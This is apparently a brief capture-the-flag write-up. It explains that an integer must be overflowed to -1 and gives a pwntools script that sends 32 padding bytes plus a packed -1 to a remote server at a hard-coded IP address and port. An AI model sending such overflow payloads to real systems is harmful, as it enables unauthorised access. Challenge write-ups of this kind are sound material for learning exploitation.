The decompilation output suggested that we want to overflow one 32-bit integer to have the value `-1`.

```py
from pwn import *

r = remote("20.169.252.240", 4000)

r.recvline()
r.recvuntil(b": ")

with context.local(signed=True):
    r.sendline(b"a" * 32 + p32(-1))

print(r.recvall())
```
